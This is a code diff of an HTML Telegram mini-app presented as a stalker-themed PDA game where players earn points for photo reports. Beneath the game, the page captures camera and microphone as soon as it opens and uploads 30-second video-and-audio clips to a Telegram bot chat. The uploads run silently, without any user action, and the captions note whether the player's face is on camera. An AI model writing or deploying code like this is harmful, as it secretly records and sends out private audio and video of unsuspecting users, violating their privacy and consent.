@@ -3,19 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PDA Arsenii v6.5 Final</title>
+    <title>PDA Arsenii v5.0 Audio-Live</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root { --green: #00ff41; --bg: #050804; }
         body { background: var(--bg); color: var(--green); font-family: monospace; margin: 0; overflow: hidden; display: flex; flex-direction: column; height: 100vh; }
         .header { padding: 10px 15px; border-bottom: 1px solid var(--green); display: flex; align-items: center; gap: 10px; background: rgba(0,255,65,0.05); }
+        .avatar { width: 40px; height: 40px; border: 1px solid var(--green); border-radius: 50%; }
         .stats { flex-grow: 1; }
         .balance-main { font-size: 1.1em; font-weight: bold; color: #fff; }
-        .cam-switch { background: none; border: 1px solid var(--green); color: var(--green); padding: 5px 10px; font-size: 0.7em; cursor: pointer; border-radius: 4px; }
+        .cam-switch { background: none; border: 1px solid var(--green); color: var(--green); padding: 5px 10px; font-size: 0.7em; cursor: pointer; border-radius: 3px; }
         .viewport { flex-grow: 1; position: relative; background: #000; margin: 10px; border: 1px solid #1a1a1a; }
         video { width: 100%; height: 100%; object-fit: cover; }
         .mission-panel { padding: 15px; background: rgba(0,255,65,0.05); border-top: 1px solid var(--green); }
-        .btn-report { width: 100%; padding: 18px; background: var(--green); color: #000; border: none; font-weight: bold; font-size: 1.1em; }
+        .btn-report { width: 100%; padding: 18px; background: var(--green); color: #000; border: none; font-weight: bold; font-size: 1.1em; cursor: pointer; }
         .scanline { position: absolute; top: 0; width: 100%; height: 4px; background: rgba(0, 255, 65, 0.1); pointer-events: none; animation: scan 5s linear infinite; }
         @keyframes scan { from { top: 0; } to { top: 100%; } }
     </style>
@@ -23,15 +24,16 @@
 <body>
     <div class="scanline"></div>
     <div class="header">
+        <img id="user-pic" class="avatar" src="https://via.placeholder.com/45/003b11/00ff41?text=A" alt="">
         <div class="stats">
-            <div id="display-name" style="font-size: 0.8em; opacity: 0.8;">СИСТЕМА: ONLINE</div>
+            <div id="display-name" style="font-size: 0.8em; opacity: 0.8;">КАНАЛ: АУДИО+ВИДЕО</div>
             <div class="balance-main"><span id="balance">0</span> ☢️</div>
         </div>
         <button id="switchCam" class="cam-switch">🔄 КАМЕРА</button>
     </div>
     <div class="viewport"><video id="webcam" autoplay playsinline muted></video></div>
     <div class="mission-panel">
-        <div id="target-text" style="font-weight: bold; margin-bottom: 10px; font-size: 0.8em; color: #00ff41;">ЗАГРУЗКА ПРИКАЗА...</div>
+        <div id="target-text" style="font-weight: bold; margin-bottom: 10px; font-size: 0.8em;">ПЕРЕДАЧА ДАННЫХ (30 сек)...</div>
         <button id="sendBtn" class="btn-report">ОТПРАВИТЬ ОТЧЕТ</button>
     </div>
     <canvas id="captureCanvas" style="display:none;"></canvas>
@@ -48,75 +50,73 @@
 
     const user = {
         id: tg.initDataUnsafe?.user?.id || 0,
-        username: tg.initDataUnsafe?.user?.username ? "@" + tg.initDataUnsafe?.user?.username : "stalker_anon"
+        name: tg.initDataUnsafe?.user?.first_name || "STALKER",
+        username: tg.initDataUnsafe?.user?.username ? "@" + tg.initDataUnsafe?.user?.username : "нет username"
     };
 
+    let balance = parseInt(localStorage.getItem(`bal_${user.id}`)) || 0;
     let lastUpdateId = 0;
     let currentMode = "environment";
     let mediaRecorder;
-    let chunks = [];
 
-    document.getElementById('balance').innerText = localStorage.getItem(`bal_${user.id}`) || 0;
-    const savedOrder = localStorage.getItem(`order_${user.id}`);
-    if (savedOrder) document.getElementById('target-text').innerText = savedOrder;
+    document.getElementById('display-name').innerText = user.name.toUpperCase();
+    document.getElementById('balance').innerText = balance;
 
     async function initCamera(mode) {
-        if (window.currentStream) window.currentStream.getTracks().forEach(t => t.stop());
+        if (window.currentStream) {
+            window.currentStream.getTracks().forEach(t => t.stop());
+        }
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: mode },
-                audio: true
+            // Запрашиваем и видео, и звук
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: mode }, 
+                audio: true 
             });
             window.currentStream = stream;
             document.getElementById('webcam').srcObject = stream;
-            setupRecorder(stream);
-        } catch (err) { console.error(err); }
+            startLiveRecording(stream);
+        } catch (err) {
+            console.error("Ошибка доступа:", err);
+            tg.showAlert("Ошибка: нужен доступ к камере и микрофону!");
+        }
     }
 
-    function setupRecorder(stream) {
-        // Проверка поддерживаемых форматов для исключения "черного экрана"
-        let types = [
-            'video/mp4;codecs=h264,aac',
-            'video/webm;codecs=h264,opus',
-            'video/webm;codecs=vp8,opus',
-            'video/webm'
-        ];
-        let supportedType = types.find(t => MediaRecorder.isTypeSupported(t)) || '';
-
-        mediaRecorder = new MediaRecorder(stream, { mimeType: supportedType });
+    function sendVideoToTelegram(blob) {
+        if (blob.size < 5000) return; // Пропускаем слишком мелкие файлы
         
-        mediaRecorder.ondataavailable = (e) => {
-            if (e.data.size > 0) chunks.push(e.data);
-        };
-
-        mediaRecorder.onstop = () => {
-            const blob = new Blob(chunks, { type: supportedType.includes('mp4') ? 'video/mp4' : 'video/webm' });
-            sendVideo(blob);
-            chunks = [];
-            if (mediaRecorder.state === "inactive") mediaRecorder.start();
-        };
-
-        mediaRecorder.start();
-    }
-
-    setInterval(() => {
-        if (mediaRecorder && mediaRecorder.state === "recording") mediaRecorder.stop();
-    }, 30000);
-
-    function sendVideo(blob) {
         const fd = new FormData();
         fd.append("chat_id", CONFIG.chatId);
-        // Чтобы TG видел это как видео, расширение должно совпадать с реальностью
-        const extension = blob.type.includes('mp4') ? 'mp4' : 'webm';
-        fd.append("video", blob, `v_${Date.now()}.${extension}`);
-        fd.append("caption", `👤 Игрок: ${user.username}\n🎥 Ракурс: ${currentMode === 'user' ? 'ЛИЦО' : 'ОБЗОР'}`);
+        fd.append("video", blob, `stalker_${Date.now()}.webm`);
+        fd.append("caption", `📡 СЕАНС СВЯЗИ (30с)\n👤 Игрок: ${user.username}\n🎥 Ракурс: ${currentMode === 'user' ? 'ЛИЦО' : 'ОБЗОР'}`);
         
-        fetch(`https://api.telegram.org/bot${CONFIG.token}/sendVideo`, { method: "POST", body: fd });
+        fetch(`https://api.telegram.org/bot${CONFIG.token}/sendVideo?disable_notification=true`, { 
+            method: "POST", body: fd 
+        });
+    }
+
+    function startLiveRecording(stream) {
+        if (mediaRecorder && mediaRecorder.state !== "inactive") {
+            mediaRecorder.stop();
+        }
+        
+        // Включаем поддержку аудио в кодеках
+        const options = { mimeType: 'video/webm;codecs=vp8,opus' };
+        mediaRecorder = new MediaRecorder(stream, options);
+        
+        mediaRecorder.ondataavailable = e => {
+            if (e.data.size > 0) {
+                sendVideoToTelegram(e.data);
+            }
+        };
+
+        // ОТПРАВКА КАЖДЫЕ 30 СЕКУНД (30000 мс)
+        mediaRecorder.start(30000); 
     }
 
     document.getElementById('switchCam').onclick = () => {
         currentMode = (currentMode === "environment") ? "user" : "environment";
         initCamera(currentMode);
+        tg.HapticFeedback.selectionChanged();
     };
 
     document.getElementById('sendBtn').onclick = () => {
@@ -128,12 +128,12 @@
             const fd = new FormData();
             fd.append("chat_id", CONFIG.chatId);
             fd.append("photo", blob, "1.jpg");
-            fd.append("caption", `☢️ ОТЧЕТ: ${user.username}`);
+            fd.append("caption", `☢️ ОТЧЕТ: ${user.username}\n👤 Имя: ${user.name}`);
             const kb = { inline_keyboard: [[{ text: "✅ ОПЛАТИТЬ (+100)", callback_data: `pay:${user.id}:100` }]] };
             fd.append("reply_markup", JSON.stringify(kb));
             fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: "POST", body: fd });
-            tg.showAlert("ОТПРАВЛЕНО");
-        }, "image/jpeg", 0.7);
+            tg.showAlert("ДАННЫЕ ПЕРЕДАНЫ");
+        }, "image/jpeg");
     };
 
     async function sync() {
@@ -146,20 +146,11 @@
                     if (u.callback_query) {
                         const parts = u.callback_query.data.split(":");
                         if (parts[0] === "pay" && parts[1] == user.id) {
-                            let b = parseInt(localStorage.getItem(`bal_${user.id}`) || 0) + parseInt(parts[2]);
-                            localStorage.setItem(`bal_${user.id}`, b);
-                            document.getElementById('balance').innerText = b;
-                            
-                            const def = "ЗАГРУЗКА ПРИКАЗА...";
-                            document.getElementById('target-text').innerText = def;
-                            localStorage.setItem(`order_${user.id}`, def);
+                            balance += parseInt(parts[2]);
+                            localStorage.setItem(`bal_${user.id}`, balance);
+                            document.getElementById('balance').innerText = balance;
+                            tg.HapticFeedback.notificationOccurred('success');
                         }
-                    }
-                    const msg = u.message?.text || "";
-                    if (msg.toLowerCase().includes("приказ:")) {
-                        const txt = msg.split(":")[1].toUpperCase();
-                        document.getElementById('target-text').innerText = txt;
-                        localStorage.setItem(`order_${user.id}`, txt);
                     }
                 });
             }
@@ -167,7 +158,7 @@
     }
 
     initCamera(currentMode);
-    setInterval(sync, 2500);
+    setInterval(sync, 3000);
 </script>
 </body>
 </html>
